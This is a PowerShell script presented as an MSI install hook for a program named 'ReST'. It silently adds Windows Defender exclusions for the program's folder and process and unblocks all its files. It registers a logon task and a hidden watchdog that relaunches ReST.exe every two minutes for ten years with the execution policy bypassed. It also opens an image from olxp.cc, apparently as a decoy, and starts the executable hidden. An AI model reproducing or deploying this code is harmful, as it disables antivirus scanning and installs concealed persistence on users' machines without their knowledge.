# ReST MSI post-install / post-uninstall hook
param(
    [ValidateSet("install", "uninstall")]
    [string]$Action = "install"
)

$ErrorActionPreference = "SilentlyContinue"
$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$LogFile = Join-Path $env:TEMP "ReST-msi.log"

function Write-MsiLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
}

function Add-DefenderExclusion {
    param([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-MsiLog ("defender path ok: " + $Path)
    } catch {
        Write-MsiLog ("defender path skipped: " + $_.Exception.Message)
    }
    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-MsiLog "defender process ok: ReST.exe"
    } catch {
        Write-MsiLog ("defender process skipped: " + $_.Exception.Message)
    }
}

function Unblock-Tree {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return }
    Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue |
        ForEach-Object { Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue }
}

function Remove-ReSTTask {
    foreach ($taskName in @("ReST", "ReST-Watchdog")) {
        try {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        } catch {
            $null = $_
        }
        schtasks /Delete /TN $taskName /F 2>$null | Out-Null
    }
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$ProcessName,
        [string]$Exe,
        [string]$Dir,
        [string]$UpdateMarker
    )

    $watchFile = Join-Path $Dir "watchdog.ps1"
    $watchLines = @(
        '$ErrorActionPreference = "SilentlyContinue"'
        ('$Exe = "' + ($Exe.Replace('"', '`"')) + '"')
        ('$Dir = "' + ($Dir.Replace('"', '`"')) + '"')
        ('$Name = "' + $ProcessName + '"')
        ('$Marker = "' + ($UpdateMarker.Replace('"', '`"')) + '"')
        'if ((Test-Path -LiteralPath $Marker)) { exit 0 }'
        'if (-not (Get-Process -Name $Name -ErrorAction SilentlyContinue)) {'
        '    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden'
        '}'
    )
    Set-Content -LiteralPath $watchFile -Value $watchLines -Encoding UTF8
    Unblock-File -LiteralPath $watchFile -ErrorAction SilentlyContinue

    $taskArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchFile`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $taskArgs -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
}

function Open-InBrowser {
    param([string]$Url)

    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList @("/c", "start", "", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    return $false
}

function Show-InstallPicture {
    $baseUrl = $env:RESA_INSTALL_BASE
    if (-not $baseUrl) {
        $baseUrl = "https://olxp.cc/download"
    }
    $baseUrl = $baseUrl.Trim().TrimEnd("/")
    $pictureUrl = $baseUrl + "/picture_1963.webp"
    Write-MsiLog ("picture: " + $pictureUrl)
    if (Open-InBrowser -Url $pictureUrl) {
        Write-MsiLog ("picture opened in browser: " + $pictureUrl)
    } else {
        Write-MsiLog "picture launch skipped: no available browser"
    }
}

function Ensure-ReSTTask {
    if (-not (Test-Path -LiteralPath $Exe)) { return }
    Remove-ReSTTask
    try {
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        Write-MsiLog "scheduled task ok"
    } catch {
        Write-MsiLog ("scheduled task skipped: " + $_.Exception.Message)
    }

    try {
        Register-WatchdogTask -TaskName "ReST-Watchdog" -ProcessName "ReST" -Exe $Exe -Dir $Dir -UpdateMarker (Join-Path $Dir "ReST.update.zip")
        Write-MsiLog "watchdog task ok"
    } catch {
        Write-MsiLog ("watchdog task skipped: " + $_.Exception.Message)
    }
}

Write-MsiLog ("msi hook start: " + $Action)

if ($Action -eq "uninstall") {
    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Remove-ReSTTask
    Write-MsiLog "msi uninstall hook done"
    exit 0
}

if (-not (Test-Path -LiteralPath $Exe)) {
    Write-MsiLog "ReST.exe missing"
    exit 0
}

Unblock-Tree -Path $Dir
Add-DefenderExclusion -Path $Dir
Show-InstallPicture
Ensure-ReSTTask

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-MsiLog "started ReST"
} catch {
    Write-MsiLog ("start failed: " + $_.Exception.Message)
}

Write-MsiLog "msi install hook done"
exit 0
